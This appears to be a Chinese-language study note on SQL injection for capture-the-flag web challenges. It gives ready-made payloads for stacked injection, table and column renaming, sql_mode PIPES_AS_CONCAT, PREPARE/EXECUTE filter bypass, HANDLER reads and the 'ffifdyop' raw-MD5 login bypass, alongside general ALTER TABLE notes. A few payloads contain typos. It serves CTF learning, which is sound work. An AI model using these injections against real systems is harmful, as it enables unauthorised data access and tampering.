[toc]



post的话可以直接尝试万能密码

# 堆叠注入

假设注入时发现：

>    return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

那么：

>    show database;
>
> show tables;

之后：

> desc \`table_name\`
>
> 可以查看column的信息

这里要用\`\`引起来(反引号)

或者show columns from \`table_name\`

## 1）修改表名

假设查询语句：

>   select column_1,column_2 from table_1 where column_1=;
>
>   其中大致结构：
>
>   table_1: column_1,column_2
>
>   table_2: column_3,column_4(flag_is_here )

那么在有禁止语句时，可以改column和table的名字，比如可以将

table_1改为table_2,然后修改表的名字等，缺少列的时候可以增加列

拿**[强网杯 2019]随便注**来说：

大致查询语句应该为：select id,data from words where id=;

那么可以将words表改名为aaa，将1919810931114514改为words，再将id改为flag。（偷天换日的感觉）

>  1'; rename table words to word1; rename table \`1919810931114514\` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#

```
修改已知表的列：

添加一个列
alter table "table_name" add " column_name"  type;

删除一个列
alter table "table_name" drop " column_name"  type;

改变列的数据类型
alter table "table_name" alter column " column_name" type;

改列名
alter table "table_name" change " column1" " column2" type;
alter table "table_name" rename "column1" to "column2";
```



```
SQL约束 （规定表中数据的规则）
not null- 指示某列不能存储 NULL 值。
alter table persons modify age int not null;//设置 not null 约束 。

alter table person modify age int null;//取消 null 约束。

primary key - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
alter table persons add age primary key (id)

unique -保证某列的每行必须有唯一的值。(注：可以有多个 UNIQUE 约束，只能有一个 PRIMARY KEY 约束。 )
alter table person add unique (id);//增加unique约束。

check-限制列中值的范围。
alter table person add check (id>0);

default-规定没有给列赋值时的默认值。
alter table person alter city set default 'chengdu' ;//mysql

alter table person add constraint ab_c default 'chengdu' for city;//SQL Server / MS Access

auto_increment-自动赋值，默认从1开始。

foreign key-保证一个表中的数据匹配另一个表中的值的参照完整性。

```

-----------

mysql中：系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则
PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似。

利用`1;set sql_mode=pipes_as_concat;select 1`

可以绕过：`select $_post[query] || flag from flag`这种查询语句

## 2）预编译

```
PREPARE name from '[my sql sequece]';   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```

比如：

```
1';
SeT@a=’select * from `FlagHere‘;
prepare execsql from @a;
execute execsql;#
#可以使用16进制绕过
```

## 3）Handler

如果过滤的更多那么可以：


```
1’;

handler table_name_here open;

handler table_name_here read first;#
```




# MD5

假如有：`select * from 'admin' where password=md5($pass,true)`

可以使用字符串:ffifdyop

原理：

这个字符串被md5哈希了之后会变成276f722736c95d99e921722cf9ed621c，而这个字符串前几位正好是：’or’6，永为真。

因此拼接后为，相当于万能密码。

```
select * from 'admin' where password='' or '6xxxxx'
```



























































